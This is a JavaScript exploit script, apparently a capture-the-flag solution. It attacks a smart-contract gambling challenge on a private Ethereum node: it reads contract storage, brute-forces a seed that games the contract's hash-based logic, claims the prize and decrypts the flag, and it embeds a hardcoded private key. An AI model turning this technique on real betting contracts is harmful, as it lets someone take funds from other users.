const fs = require('fs');
const Web3 = require('web3');
const EthCrypto = require('eth-crypto');
const contract = require('truffle-contract');

var target_addr = process.argv[2];
console.log('target address = ' + target_addr);

const kProvider = 'http://192.168.199.152:8545';
var provider = new Web3.providers.HttpProvider(kProvider)

provider.sendAsync = async function () {
    await this.send.apply(this, arguments);
}

var web3 = new Web3(provider);

var sagproxy_compiled = JSON.parse(fs.readFileSync('build/contracts/SagProxy.json'));
var SagProxy = contract({ abi: sagproxy_compiled.abi });
SagProxy.setProvider(provider);

var sag_compiled = JSON.parse(fs.readFileSync('build/contracts/Sag.json'));
var Sag = contract({ abi: sag_compiled.abi });
Sag.setProvider(provider);

function genseq(seed, mask) {
    let data = new Array(32);
    let tmp = seed;
    for (let i = 0; i < 32; i++) {
        tmp = web3.utils.toBN(web3.utils.soliditySha3(tmp)).xor(mask);
        data[i] = web3.utils.toHex(tmp);
    }
    return data;
}

function count(data) {
    let cnt = 0;
    for (let i = 0; i < 32; i++) {
        for (let j = i + 1; j < 32; j++) {
            if (data[i] < data[j]) {
                cnt += 1;
                let tmp = data[i];
                data[i] = data[j];
                data[j] = tmp;
            }
        }
    }
    return cnt;
}

function fight(mask, limit) {
    var best = 32 * 31 / 2;
    for (var i = 0; ; i++) {
        var seed = web3.utils.toBN(i);
        var seq = genseq(seed, mask);
        var seq_ = seq.slice(0);
        var cnt = count(seq_);
        if (cnt < best) {
            console.log(i, cnt);
            best = cnt;
        }
        if (cnt < limit) {
            return {
                mask: web3.utils.toHex(mask),
                numbers: seq,
                sorted: seq_,
                swap: cnt,
                max: seq_[0],
                seed: web3.utils.toHex(seed),
            }
        }
    }
}

(async () => {
    try {
        const me = web3.eth.accounts.privateKeyToAccount('0xa5f34f6876b0e6f9936f235ed86fd4e07245da5c2d39f024ff732339ec94dffc');

        console.log('using account', me);

        var sag_proxy = await SagProxy.at(target_addr);
        const sag_addr = await web3.eth.getStorageAt(sag_proxy.address, 0);
        const owner = await web3.eth.getStorageAt(sag_proxy.address, 1);
        console.log('sag', sag_addr);
        console.log('owner', owner);

        var sag = await Sag.at(sag_addr);

        // gas est: k + swap * 10576
        var result = fight(web3.utils.toBN(me.address), 150);
        console.log(result);

        var r = await sag.gamble(result.max, result.seed, {
        // var r = await sag_proxy.gamble(result.max, result.seed, {
            from: me.address,
            gas: 3000000,
        });

        console.log(r);
        for (let i = 0; i < r.logs.length; i++) {
            let log = r.logs[i];
            if (log.event == 'HasGambleRequest') {
                console.log(log.event, web3.utils.toHex(log.args.sender));
            } else if (log.event == 'GambleResult') {
                console.log(log.event, web3.utils.toHex(log.args.sender),
                    web3.utils.toHex(log.args.guess), web3.utils.toHex(log.args.max));
            } else {
                console.log(log.event, log.args);
            }
        }

        const msg = 'haha';
        const sig = web3.eth.accounts.sign(msg, me.privateKey);
        console.log('generated signature', sig);

        r = await sag_proxy.requestPrize(sig.messageHash, sig.v, sig.r, sig.s, {
            from: me.address,
        });

        console.log('requested prize');

        sag_proxy.PrizeReady({
            winner: me.address,
        }, {
                fromBlock: 0,
            }, async (e, r) => {
                if (!e) {
                    console.log(r);
                    try {
                        const msg = EthCrypto.cipher.parse(r.args.prize.substr(2));
                        console.log('msg', msg);
                        const flag = await EthCrypto.decryptWithPrivateKey(me.privateKey, msg);
                        console.log(flag);
                    } catch (e) {
                        console.error(e);
                    }
                }
            });

    } catch (e) {
        console.error(e);
    }
})();
